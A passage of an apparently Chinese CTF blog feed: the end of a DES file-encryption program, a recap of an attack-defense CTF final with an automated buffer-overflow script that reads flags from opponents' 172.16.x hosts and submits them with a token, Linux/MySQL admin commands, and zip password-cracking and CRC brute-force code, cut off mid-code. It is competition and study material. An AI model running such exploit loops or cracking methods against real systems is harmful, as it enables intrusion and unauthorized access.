class="line">    fseek(cipher,<span class="number">0</span>,SEEK_END);   <span class="comment">//将文件指针置尾  </span></div><div class="line">    fileLen = ftell(cipher);    <span class="comment">//取文件指针当前位置  </span></div><div class="line">    rewind(cipher);             <span class="comment">//将文件指针重指向文件头  </span></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;  </div><div class="line">        <span class="comment">//密文的字节数一定是8的整数倍  </span></div><div class="line">        fread(cipherBlock,<span class="keyword">sizeof</span>(<span class="keyword">char</span>),<span class="number">8</span>,cipher);  </div><div class="line">        DES_DecryptBlock(cipherBlock,subKeys,plainBlock);                         </div><div class="line">        times += <span class="number">8</span>;  </div><div class="line">        <span class="keyword">if</span>(times &lt; fileLen)&#123;  </div><div class="line">            fwrite(plainBlock,<span class="keyword">sizeof</span>(<span class="keyword">char</span>),<span class="number">8</span>,plain);  </div><div class="line">        &#125;  </div><div class="line">        <span class="keyword">else</span>&#123;  </div><div class="line">            <span class="keyword">break</span>;  </div><div class="line">        &#125;  </div><div class="line">    &#125;  </div><div class="line">    <span class="comment">//判断末尾是否被填充  </span></div><div class="line">    <span class="keyword">if</span>(plainBlock[<span class="number">7</span>] &lt; <span class="number">8</span>)&#123;  </div><div class="line">        <span class="keyword">for</span>(count = <span class="number">8</span> - plainBlock[<span class="number">7</span>]; count &lt; <span class="number">7</span>; count++)&#123;  </div><div class="line">            <span class="keyword">if</span>(plainBlock[count] != <span class="string">'\0'</span>)&#123;  </div><div class="line">                <span class="keyword">break</span>;  </div><div class="line">            &#125;  </div><div class="line">        &#125;  </div><div class="line">    &#125;     </div><div class="line">    <span class="keyword">if</span>(count == <span class="number">7</span>)&#123;<span class="comment">//有填充  </span></div><div class="line">        fwrite(plainBlock,<span class="keyword">sizeof</span>(<span class="keyword">char</span>),<span class="number">8</span> - plainBlock[<span class="number">7</span>],plain);  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">else</span>&#123;<span class="comment">//无填充  </span></div><div class="line">        fwrite(plainBlock,<span class="keyword">sizeof</span>(<span class="keyword">char</span>),<span class="number">8</span>,plain);  </div><div class="line">    &#125;  </div><div class="line">  </div><div class="line">    fclose(plain);  </div><div class="line">    fclose(cipher);  </div><div class="line">    <span class="keyword">return</span> OK;  </div><div class="line">&#125; </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></div><div class="line"><span class="function"></span>&#123;     </div><div class="line">    <span class="keyword">clock_t</span> a,b;  </div><div class="line">    a = clock();  </div><div class="line">    DES_Encrypt(<span class="string">"flag.txt"</span>,<span class="string">"key.txt"</span>,<span class="string">"2.txt"</span>);  </div><div class="line">    b = clock();  </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"加密消耗%d毫秒\n"</span>,b-a);  </div><div class="line">      </div><div class="line">    system(<span class="string">"pause"</span>);  </div><div class="line">    a = clock();  </div><div class="line">    DES_Decrypt(<span class="string">"2.txt"</span>,<span class="string">"key.txt"</span>,<span class="string">"3.txt"</span>);  </div><div class="line">    b = clock();  </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"解密消耗%d毫秒\n"</span>,b-a);  </div><div class="line">    getchar();  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一下代码，方便使用&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第四届MIAC线下总结</title>
    <link href="http://yoursite.com/2017/12/04/2017_12_24_miac_xianxia/"/>
    <id>http://yoursite.com/2017/12/04/2017_12_24_miac_xianxia/</id>
    <published>2017-12-04T06:58:52.428Z</published>
    <updated>2018-03-23T01:10:08.815Z</updated>
    
    <content type="html"><![CDATA[<p>虽然我已经大三了，可是线下这是第二次，表示体验真的是非常不好，不过还是知道自己还是有很多东西要学习<br><a id="more"></a></p><h2 id="1、环境"><a href="#1、环境" class="headerlink" title="1、环境"></a>1、环境</h2><p>这是MIAC在决赛，这时不得不提初赛，第一个初赛直接被各种大佬打爆平台，导致所有队伍全部被改名字，主办方只好取消。后面两次虽然成功，但是结果仍然让我们出乎意料(一般都是前20进入决赛，这是前80，难以想象[这里后面证明是正确的])。</p><h2 id="2、比赛"><a href="#2、比赛" class="headerlink" title="2、比赛"></a>2、比赛</h2><p>比赛前一晚：看了比赛规则，发现有一台靶机和一台攻击机机（这是啥）,一小时一轮，一个三轮（后面怀疑主办方的说明，居然一个小时一个题目[一个5小轮]）。于是开始准备各种工具，自动提交flag脚本，通防工具，提取脚本，木马（后来都输给了主板方）。<br>比赛前:80个队伍，做得位置全部不知道（蒙）。终于进场了，都是找了好久，终于找到位置。发现我们只能用攻击机工具别人的靶机（类似实验吧）。<br>第一轮:葛师傅和潘师傅找到web题目，我在找pwn题目（最后，，，一个小时过去了，找不到题目，发现根本没有pwn题目），葛师傅很气愤，因为题目不能下下来。而且，自己电脑和靶机电脑是网络隔离的。不能用ssh连接。<br>第二轮:潘师傅和葛师傅找到mysql的弱密码，然后开始写文件进去，读文件出来，但是不知道为什么不能读到flag,而我只能在那里维护，看看那些ip来连接了我们，然后去杀掉pid.<br>第三轮:mysql的弱密码，这里可以读取flag了。可是这里主办方的flag不能及时刷新，导致我们提交的flag不对，这里问技术人员，他说赛后在谈论。</p><h2 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h2><p>1、首先这个比赛没有pwn题，那bin师傅只能看看屏幕了。<br>2、对比赛规则要仔细研究<br>3、liunx下的命令要熟悉</p><p>总结:<br>1、一上去可以连接上去，先备份一下所有的镜像文件。<br>2、修改自己的靶机（服务器）的密码，mysql的密码<br>3、看看有哪些题目<br>4、先挂上通防，等主办方来警告就撤下来</p><h2 id="4、脚本"><a href="#4、脚本" class="headerlink" title="4、脚本"></a>4、脚本</h2><p>这里pwn题自动提交flag脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line">context(arch = <span class="string">'amd64'</span>)</div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">start = time.time()</div><div class="line"><span class="comment">#p = process('./pwn')</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">28</span>):</div><div class="line"><span class="keyword">try</span>:</div><div class="line"><span class="comment">#if i == 25:</span></div><div class="line"><span class="comment">#continue</span></div><div class="line">p = remote(<span class="string">'172.16.%s.102'</span> % i,<span class="number">20002</span>)</div><div class="line">p.recv()</div><div class="line">payload=<span class="string">"a"</span>*<span class="number">213</span></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">timestart = time.time()</div><div class="line">p.sendline(<span class="string">'cat /home/newcalc/flag'</span>)</div><div class="line">a = p.recvline(timeout=<span class="number">5</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"============="</span> </div><div class="line"><span class="keyword">print</span> a[<span class="number">2</span>:]</div><div class="line">url_platform = <span class="string">'http://172.16.200.3:9000/submit_flag/'</span></div><div class="line">token = <span class="string">'L4FBjK6K3nhkTcFMcwDGuWOwqR9GYbghNbtmOc49wjRiKS60SoILVjFgMpj3Etcx7R0wMIrB1os'</span></div><div class="line">post_data = &#123;</div><div class="line"><span class="string">'token'</span>:token,</div><div class="line"><span class="string">'flag'</span>:a[<span class="number">2</span>:]</div><div class="line">&#125;</div><div class="line">r = requests.post(url_platform, data = post_data)</div><div class="line">timenow = time.time()-timestart</div><div class="line"><span class="keyword">if</span>(timenow == <span class="number">5</span>):</div><div class="line"><span class="keyword">continue</span></div><div class="line"><span class="comment">#p.interactive()</span></div><div class="line"><span class="keyword">except</span>:</div><div class="line"><span class="keyword">pass</span></div><div class="line">end = time.time()</div><div class="line">time.sleep(<span class="number">300</span> - (end -start))</div></pre></td></tr></table></figure></p><p>这里是liunx命令:<br>备份数据库<br><code>mysqldump -u 用户名 -p 密码 数据库名 &gt; back.sql</code><br><code>mysqldump -u root -p 123456 mysql &gt; back.sql</code><br>备份所有数据库<br><code>mysqldump --all-databases &gt; bak.sql</code><br>还原数据库<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql   </div><div class="line">find / *.php -perm        </div><div class="line">awk -F:  /etc/passwd     </div><div class="line">crontab -l</div></pre></td></tr></table></figure></p><p>查看那些端口开放<br><code>netstat -pantu</code><br><img src="" alt=""><br><code>ps -anu</code><br><img src="" alt=""><br>杀死PID<br><code>kill 9511</code><br>查看tcp连接的数量<br><code>netstat -ant|awk  |grep |sed -e  -e |sort|uniq -c|sort -rn</code><br>找到某个文件<br><code>find / -name 文件名</code><br>解压<br><code>tar -xvf file.tar</code><br><code>unzip file.zip</code><br><code>unrar e file.rar</code><br>连接ssh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ssh root@192.168.1.14</div><div class="line">yes</div><div class="line">password</div><div class="line">ifconfig</div></pre></td></tr></table></figure></p><p>登录mysql数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql -u root -h -p123456</div><div class="line">ifconfig</div></pre></td></tr></table></figure></p><p>将/var/www/html目录下的文件设置为不允许任何人修改<br><code>chattr -R +i /var/www/html</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;虽然我已经大三了，可是线下这是第二次，表示体验真的是非常不好，不过还是知道自己还是有很多东西要学习&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>给你压缩包却又不给你密码的人在想什么</title>
    <link href="http://yoursite.com/2017/11/11/misc_crc/"/>
    <id>http://yoursite.com/2017/11/11/misc_crc/</id>
    <published>2017-11-11T08:55:50.864Z</published>
    <updated>2018-03-22T03:40:35.184Z</updated>
    
    <content type="html"><![CDATA[<p>当然是有秘密不能给汝看，必学中华人民共和国网络安全法<br><a id="more"></a></p><h1 id="1、压缩包"><a href="#1、压缩包" class="headerlink" title="1、压缩包"></a>1、压缩包</h1><h2 id="1、rar加密压缩包"><a href="#1、rar加密压缩包" class="headerlink" title="1、rar加密压缩包"></a>1、rar加密压缩包</h2><h3 id="1、爆破"><a href="#1、爆破" class="headerlink" title="1、爆破"></a>1、爆破</h3><p>直接用ARCHPR爆破，这里有些技巧，数字1-10位跑一下（大概2分钟），字母跑6位左右，如果跑不出来，那这道题你就走偏啦。</p><h3 id="2、CRC明文攻击"><a href="#2、CRC明文攻击" class="headerlink" title="2、CRC明文攻击"></a>2、CRC明文攻击</h3><p>这里和zip文明攻击一样的，代码在zip明文攻击那里。</p><h2 id="2、zip加密压缩包"><a href="#2、zip加密压缩包" class="headerlink" title="2、zip加密压缩包"></a>2、zip加密压缩包</h2><h2 id="1、看看是不是伪加密"><a href="#1、看看是不是伪加密" class="headerlink" title="1、看看是不是伪加密"></a>1、看看是不是伪加密</h2><p>010打开zip压缩包，伪加密的<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flgeh39gakj311s0iewiz.jpg" alt=""><br>修改为正常的<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flgej1amtmj311k0hf78k.jpg" alt=""><br>可以打开了</p><p>kali也可以直接提取zip伪加密？？？</p><h3 id="1、爆破-1"><a href="#1、爆破-1" class="headerlink" title="1、爆破"></a>1、爆破</h3><p>直接用ARCHPR爆破，这里有些技巧，数字1-10位跑一下（大概2分钟），字母跑6位左右，如果跑不出来，那这道题你就走偏啦。</p><h3 id="2、CRC明文攻击-1"><a href="#2、CRC明文攻击-1" class="headerlink" title="2、CRC明文攻击"></a>2、CRC明文攻击</h3><p>如果是这样的,就可以啦<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flgeoti8shj311z0lj0wv.jpg" alt=""><br>取出zip中的CRC<br>python代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> zipfile, os</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line">c=[]</div><div class="line">rootname = <span class="string">'misc_big_zip.zip'</span>;</div><div class="line">r = <span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@"</span>;</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">41</span>):</div><div class="line">    <span class="keyword">if</span> i &lt; <span class="number">10</span>:</div><div class="line">        t = <span class="string">"0"</span> + str(i)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        t = str(i)</div><div class="line">    name = <span class="string">"small_"</span> + t + <span class="string">".txt"</span>;</div><div class="line">    <span class="keyword">print</span> name;</div><div class="line">    zipFile = zipfile.ZipFile(os.path.join(os.getcwd(), rootname));</div><div class="line">    zipinfo = zipFile.getinfo(name);</div><div class="line">    crcs = zipinfo.CRC;</div><div class="line">    c.append(crcs)</div><div class="line"><span class="keyword">print</span> c</div></pre></td></tr></table></figure></p><p>C语言CRC代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">Crc32_ComputeBuf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> bufLen)</span> </span>&#123;</div><div class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> crcTable[<span class="number">256</span>] = &#123;</div><div class="line"><span class="number">0x00000000</span>,<span class="number">0x77073096</span>,<span class="number">0xEE0E612C</span>,<span class="number">0x990951BA</span>,<span class="number">0x076DC419</span>,<span class="number">0x706AF48F</span>,<span class="number">0xE963A535</span>,</div><div class="line"><span class="number">0x9E6495A3</span>,<span class="number">0x0EDB8832</span>,<span class="number">0x79DCB8A4</span>,<span class="number">0xE0D5E91E</span>,<span class="number">0x97D2D988</span>,<span class="number">0x09B64C2B</span>,<span class="number">0x7EB17CBD</span>,</div><div class="line"><span class="number">0xE7B82D07</span>,<span class="number">0x90BF1D91</span>,<span class="number">0x1DB71064</span>,<span class="number">0x6AB020F2</span>,<span class="number">0xF3B97148</span>,<span class="number">0x84BE41DE</span>,<span class="number">0x1ADAD47D</span>,</div><div class="line"><span class="number">0x6DDDE4EB</span>,<span class="number">0xF4D4B551</span>,<span class="number">0x83D385C7</span>,<span class="number">0x136C9856</span>,<span class="number">0x646BA8C0</span>,<span class="number">0xFD62F97A</span>,<span class="number">0x8A65C9EC</span>,</div><div class="line"><span class="number">0x14015C4F</span>,<span class="number">0x63066CD9</span>,<span class="number">0xFA0F3D63</span>,<span class="number">0x8D080DF5</span>,<span class="number">0x3B6E20C8</span>,<span class="number">0x4C69105E</span>,<span class="number">0xD56041E4</span>,</div><div class="line"><span class="number">0xA2677172</span>,<span class="number">0x3C03E4D1</span>,<span class="number">0x4B04D447</span>,<span class="number">0xD20D85FD</span>,<span class="number">0xA50AB56B</span>,<span class="number">0x35B5A8FA</span>,<span class="number">0x42B2986C</span>,</div><div class="line"><span class="number">0xDBBBC9D6</span>,<span class="number">0xACBCF940</span>,<span class="number">0x32D86CE3</span>,<span class="number">0x45DF5C75</span>,<span class="number">0xDCD60DCF</span>,<span class="number">0xABD13D59</span>,<span class="number">0x26D930AC</span>,</div><div class="line"><span class="number">0x51DE003A</span>,<span class="number">0xC8D75180</span>,<span class="number">0xBFD06116</span>,<span class="number">0x21B4F4B5</span>,<span class="number">0x56B3C423</span>,<span class="number">0xCFBA9599</span>,<span class="number">0xB8BDA50F</span>,</div><div class="line"><span class="number">0x2802B89E</span>,<span class="number">0x5F058808</span>,<span class="number">0xC60CD9B2</span>,<span class="number">0xB10BE924</span>,<span class="number">0x2F6F7C87</span>,<span class="number">0x58684C11</span>,<span class="number">0xC1611DAB</span>,</div><div class="line"><span class="number">0xB6662D3D</span>,<span class="number">0x76DC4190</span>,<span class="number">0x01DB7106</span>,<span class="number">0x98D220BC</span>,<span class="number">0xEFD5102A</span>,<span class="number">0x71B18589</span>,<span class="number">0x06B6B51F</span>,</div><div class="line"><span class="number">0x9FBFE4A5</span>,<span class="number">0xE8B8D433</span>,<span class="number">0x7807C9A2</span>,<span class="number">0x0F00F934</span>,<span class="number">0x9609A88E</span>,<span class="number">0xE10E9818</span>,<span class="number">0x7F6A0DBB</span>,</div><div class="line"><span class="number">0x086D3D2D</span>,<span class="number">0x91646C97</span>,<span class="number">0xE6635C01</span>,<span class="number">0x6B6B51F4</span>,<span class="number">0x1C6C6162</span>,<span class="number">0x856530D8</span>,<span class="number">0xF262004E</span>,</div><div class="line"><span class="number">0x6C0695ED</span>,<span class="number">0x1B01A57B</span>,<span class="number">0x8208F4C1</span>,<span class="number">0xF50FC457</span>,<span class="number">0x65B0D9C6</span>,<span class="number">0x12B7E950</span>,<span class="number">0x8BBEB8EA</span>,</div><div class="line"><span class="number">0xFCB9887C</span>,<span class="number">0x62DD1DDF</span>,<span class="number">0x15DA2D49</span>,<span class="number">0x8CD37CF3</span>,<span class="number">0xFBD44C65</span>,<span class="number">0x4DB26158</span>,<span class="number">0x3AB551CE</span>,</div><div class="line"><span class="number">0xA3BC0074</span>,<span class="number">0xD4BB30E2</span>,<span class="number">0x4ADFA541</span>,<span class="number">0x3DD895D7</span>,<span class="number">0xA4D1C46D</span>,<span class="number">0xD3D6F4FB</span>,<span class="number">0x4369E96A</span>,</div><div class="line"><span class="number">0x346ED9FC</span>,<span class="number">0xAD678846</span>,<span class="number">0xDA60B8D0</span>,<span class="number">0x44042D73</span>,<span class="number">0x33031DE5</span>,<span class="number">0xAA0A4C5F</span>,<span class="number">0xDD0D7CC9</span>,</div><div class="line"><span class="number">0x5005713C</span>,<span class="number">0x270241AA</span>,<span class="number">0xBE0B1010</span>,<span class="number">0xC90C2086</span>,<span class="number">0x5768B525</span>,<span class="number">0x206F85B3</span>,<span class="number">0xB966D409</span>,</div><div class="line"><span class="number">0xCE61E49F</span>,<span class="number">0x5EDEF90E</span>,<span class="number">0x29D9C998</span>,<span class="number">0xB0D09822</span>,<span class="number">0xC7D7A8B4</span>,<span class="number">0x59B33D17</span>,<span class="number">0x2EB40D81</span>,</div><div class="line"><span class="number">0xB7BD5C3B</span>,<span class="number">0xC0BA6CAD</span>,<span class="number">0xEDB88320</span>,<span class="number">0x9ABFB3B6</span>,<span class="number">0x03B6E20C</span>,<span class="number">0x74B1D29A</span>,<span class="number">0xEAD54739</span>,</div><div class="line"><span class="number">0x9DD277AF</span>,<span class="number">0x04DB2615</span>,<span class="number">0x73DC1683</span>,<span class="number">0xE3630B12</span>,<span class="number">0x94643B84</span>,<span class="number">0x0D6D6A3E</span>,<span class="number">0x7A6A5AA8</span>,</div><div class="line"><span class="number">0xE40ECF0B</span>,<span class="number">0x9309FF9D</span>,<span class="number">0x0A00AE27</span>,<span class="number">0x7D079EB1</span>,<span class="number">0xF00F9344</span>,<span class="number">0x8708A3D2</span>,<span class="number">0x1E01F268</span>,</div><div class="line"><span class="number">0x6906C2FE</span>,<span class="number">0xF762575D</span>,<span class="number">0x806567CB</span>,<span class="number">0x196C3671</span>,<span class="number">0x6E6B06E7</span>,<span class="number">0xFED41B76</span>,<span class="number">0x89D32BE0</span>,</div><div class="line"><span class="number">0x10DA7A5A</span>,<span class="number">0x67DD4ACC</span>,<span class="number">0xF9B9DF6F</span>,<span class="number">0x8EBEEFF9</span>,<span class="number">0x17B7BE43</span>,<span class="number">0x60B08ED5</span>,<span class="number">0xD6D6A3E8</span>,</div><div class="line"><span class="number">0xA1D1937E</span>,<span class="number">0x38D8C2C4</span>,<span class="number">0x4FDFF252</span>,<span class="number">0xD1BB67F1</span>,<span class="number">0xA6BC5767</span>,<span class="number">0x3FB506DD</span>,<span class="number">0x48B2364B</span>,</div><div class="line"><span class="number">0xD80D2BDA</span>,<span class="number">0xAF0A1B4C</span>,<span class="number">0x36034AF6</span>,<span class="number">0x41047A60</span>,<span class="number">0xDF60EFC3</span>,<span class="number">0xA867DF55</span>,<span class="number">0x316E8EEF</span>,</div><div class="line"><span class="number">0x4669BE79</span>,<span class="number">0xCB61B38C</span>,<span class="number">0xBC66831A</span>,<span class="number">0x256FD2A0</span>,<span class="number">0x5268E236</span>,<span class="number">0xCC0C7795</span>,<span class="number">0xBB0B4703</span>,</div><div class="line"><span class="number">0x220216B9</span>,<span class="number">0x5505262F</span>,<span class="number">0xC5BA3BBE</span>,<span class="number">0xB2BD0B28</span>,<span class="number">0x2BB45A92</span>,<span class="number">0x5CB36A04</span>,<span class="number">0xC2D7FFA7</span>,</div><div class="line"><span class="number">0xB5D0CF31</span>,<span class="number">0x2CD99E8B</span>,<span class="number">0x5BDEAE1D</span>,<span class="number">0x9B64C2B0</span>,<span class="number">0xEC63F226</span>,<span class="number">0x756AA39C</span>,<span class="number">0x026D930A</span>,</div><div class="line"><span class="number">0x9C0906A9</span>,<span class="number">0xEB0E363F</span>,<span class="number">0x72076785</span>,<span class="number">0x05005713</span>,<span class="number">0x95BF4A82</span>,<span class="number">0xE2B87A14</span>,<span class="number">0x7BB12BAE</span>,</div><div class="line"><span class="number">0x0CB61B38</span>,<span class="number">0x92D28E9B</span>,<span class="number">0xE5D5BE0D</span>,<span class="number">0x7CDCEFB7</span>,<span class="number">0x0BDBDF21</span>,<span class="number">0x86D3D2D4</span>,<span class="number">0xF1D4E242</span>,</div><div class="line"><span class="number">0x68DDB3F8</span>,<span class="number">0x1FDA836E</span>,<span class="number">0x81BE16CD</span>,<span class="number">0xF6B9265B</span>,<span class="number">0x6FB077E1</span>,<span class="number">0x18B74777</span>,<span class="number">0x88085AE6</span>,</div><div class="line"><span class="number">0xFF0F6A70</span>,<span class="number">0x66063BCA</span>,<span class="number">0x11010B5C</span>,<span class="number">0x8F659EFF</span>,<span class="number">0xF862AE69</span>,<span class="number">0x616BFFD3</span>,<span class="number">0x166CCF45</span>,</div><div class="line"><span class="number">0xA00AE278</span>,<span class="number">0xD70DD2EE</span>,<span class="number">0x4E048354</span>,<span class="number">0x3903B3C2</span>,<span class="number">0xA7672661</span>,<span class="number">0xD06016F7</span>,<span class="number">0x4969474D</span>,</div><div class="line"><span class="number">0x3E6E77DB</span>,<span class="number">0xAED16A4A</span>,<span class="number">0xD9D65ADC</span>,<span class="number">0x40DF0B66</span>,<span class="number">0x37D83BF0</span>,<span class="number">0xA9BCAE53</span>,<span class="number">0xDEBB9EC5</span>,</div><div class="line"><span class="number">0x47B2CF7F</span>,<span class="number">0x30B5FFE9</span>,<span class="number">0xBDBDF21C</span>,<span class="number">0xCABAC28A</span>,<span class="number">0x53B39330</span>,<span class="number">0x24B4A3A6</span>,<span class="number">0xBAD03605</span>,</div><div class="line"><span class="number">0xCDD70693</span>,<span class="number">0x54DE5729</span>,<span class="number">0x23D967BF</span>,<span class="number">0xB3667A2E</span>,<span class="number">0xC4614AB8</span>,<span class="number">0x5D681B02</span>,<span class="number">0x2A6F2B94</span>,</div><div class="line"><span class="number">0xB40BBE37</span>,<span class="number">0xC30C8EA1</span>,<span class="number">0x5A05DF1B</span>,<span class="number">0x2D02EF8D</span></div><div class="line">&#125;;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> crc32 = <span class="number">0xFFFFFFFF</span>;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *byteBuf;</div><div class="line"><span class="keyword">size_t</span> i;</div><div class="line"></div><div class="line">byteBuf = (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)buf;</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; bufLen; i++) &#123;</div><div class="line">crc32 = (crc32 &gt;&gt; <span class="number">8</span>) ^ crcTable[(crc32 ^ byteBuf[i]) &amp; <span class="number">0xFF</span>];</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> crc32 ^ <span class="number">0xFFFFFFFF</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">char</span> *charSet = <span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@\n "</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> crc32[] = &#123; <span class="number">1606238046</span>, <span class="number">1943531056</span>, <span class="number">3598719407L</span>, <span class="number">2578797435L</span>, <span class="number">1405086858</span>, <span class="number">2143805016</span>, <span class="number">3234701029L</span>, <span class="number">3224637410L</span>, </div><div class="line"><span class="number">2346013297L</span>, <span class="number">1146766327</span>, <span class="number">4038678768L</span>, <span class="number">3119445409L</span>, <span class="number">2111148220</span>, <span class="number">383413051</span>, <span class="number">2853461348L</span>, <span class="number">3176759361L</span>, <span class="number">1852520927</span>, </div><div class="line"><span class="number">3083243303L</span>, <span class="number">2151747034L</span>, <span class="number">1392140456</span>, <span class="number">544449252</span>, <span class="number">1871340857</span>, <span class="number">574988077</span>, <span class="number">3459049483L</span>, <span class="number">2786065872L</span>, <span class="number">3888485555L</span>, </div><div class="line"><span class="number">1716930793</span>, <span class="number">1933746678</span>, <span class="number">3178216769L</span>, <span class="number">3774357278L</span>, <span class="number">622718466</span>, <span class="number">1488109481</span>, <span class="number">525106857</span>, <span class="number">3123386181L</span>, <span class="number">3472027048L</span>, </div><div class="line"><span class="number">616379830</span>, <span class="number">3728848209L</span>, <span class="number">1358333123</span>, <span class="number">1852520927</span>, <span class="number">3096466191L</span>, <span class="number">622718466</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">char</span> tmp[<span class="number">6</span>] = <span class="string">""</span>;</div><div class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(charSet);</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="keyword">sizeof</span>(crc32) / <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>) - <span class="number">1</span>;h&gt;=<span class="number">0</span>; h--) &#123;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">0</span>; a &lt; len; a++) &#123;</div><div class="line">tmp[<span class="number">0</span>] = charSet[a];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> b = <span class="number">0</span>; b &lt; len; b++) &#123;</div><div class="line">tmp[<span class="number">1</span>] = charSet[b];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> c = <span class="number">0</span>; c &lt; len; c++) &#123;</div><div class="line">tmp[<span 